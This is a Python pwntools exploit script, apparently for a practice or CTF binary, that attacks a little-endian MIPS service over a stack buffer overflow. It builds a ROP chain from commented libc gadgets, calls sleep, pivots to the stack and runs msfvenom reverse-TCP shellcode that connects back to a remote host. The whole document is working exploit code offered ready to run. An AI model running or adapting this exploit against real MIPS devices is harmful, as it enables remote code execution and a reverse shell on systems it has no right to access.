from pwn import *
context(log_level='debug',arch='mips',endian='little',bits=32)

io=remote("127.0.0.1",9999)

libc_base=0x3fecd000
sleep_func=0x2f2b0+libc_base


# msfvenom -p linux/mipsle/shell_reverse_tcp --arch mipsle --platform linux -f py --bad-chars '\x00'
buf =  b""
buf += b"\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21"
buf += b"\xfd\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24"
buf += b"\x0c\x01\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f"
buf += b"\xfd\xff\x0f\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf"
buf += b"\x11\x5c\x0e\x3c\x11\x5c\xce\x35\xe4\xff\xae\xaf"
buf += b"\xf7\x83\x0e\x3c\xc0\xa8\xce\x35\xe6\xff\xae\xaf"
buf += b"\xe2\xff\xa5\x27\xef\xff\x0c\x24\x27\x30\x80\x01"
buf += b"\x4a\x10\x02\x24\x0c\x01\x01\x01\xfd\xff\x11\x24"
buf += b"\x27\x88\x20\x02\xff\xff\xa4\x8f\x21\x28\x20\x02"
buf += b"\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff\xff\x10\x24"
buf += b"\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff\x06\x28"
buf += b"\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf\xaf"
buf += b"\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf"
buf += b"\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf"
buf += b"\xfc\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24"
buf += b"\x0c\x01\x01\x01"
shellcode=buf


gadget0=0x2FB10+libc_base
# .text:0002FB10 01 00 04 24                   li      $a0, 1
# .text:0002FB14 21 C8 20 02                   move    $t9, $s1
# .text:0002FB18 09 F8 20 03                   jalr    $t9 ; sub_2F818


gadget1=0x7730+libc_base
# .text:00007730 28 00 BF 8F                   lw      $ra, 0x18+var_s10($sp)
# .text:00007734 24 00 B3 8F                   lw      $s3, 0x18+var_sC($sp)
# .text:00007738 20 00 B2 8F                   lw      $s2, 0x18+var_s8($sp)
# .text:0000773C 1C 00 B1 8F                   lw      $s1, 0x18+var_s4($sp)
# .text:00007740 18 00 B0 8F                   lw      $s0, 0x18+var_s0($sp)
# .text:00007744 08 00 E0 03                   jr      $ra


gadget2=0x20F1C+libc_base
# .text:00020F1C 21 C8 40 02                   move    $t9, $s2
# .text:00020F20 24 00 BF 8F                   lw      $ra, 0x18+var_sC($sp)
# .text:00020F24 20 00 B2 8F                   lw      $s2, 0x18+var_s8($sp)
# .text:00020F28 1C 00 B1 8F                   lw      $s1, 0x18+var_s4($sp)
# .text:00020F2C 18 00 B0 8F                   lw      $s0, 0x18+var_s0($sp)
# .text:00020F30 08 00 20 03                   jr      $t9


gadget3=0x16DD0+libc_base
# .text:00016DD0 18 00 A4 27                   addiu   $a0, $sp, 0x38+var_20
# .text:00016DD4 21 C8 00 02                   move    $t9, $s0
# .text:00016DD8 09 F8 20 03                   jalr    $t9


gadget4=0x214A0+libc_base
# .text:000214A0 21 C8 80 00                   move    $t9, $a0
# .text:000214A4 18 00 A2 AF                   sw      $v0, 0x30+var_18($sp)
# .text:000214A8 09 F8 20 03                   jalr    $t9


#stack for gadget1
payload=b"a"*51 #padding
payload+=p32(gadget1) # $ra0->gadget1
payload+=b"a"*0x18 #padding
payload+=b"aaaa" # $s0
payload+=p32(gadget2) # $s1->gadget2
payload+=p32(sleep_func) # $s2->sleep_func
payload+=b"aaaa" #padding
payload+=p32(gadget0) # $ra1->gadget0


#stack for gadget2
payload+=b"a"*0x1c #padding
payload+=p32(gadget4) # $s0->gadget
payload+=b"aaaa"*2 #padding
payload+=p32(gadget3) # $ra2->gadget3

# gadget1->gadget0->gadget2->sleep(1)->gadget3->gadget4

#stack for shellcode
payload+=b"a"*0x18
payload+=shellcode

io.recvuntil(b"Send Me Bytes:")

io.sendline(payload)

io.interactive()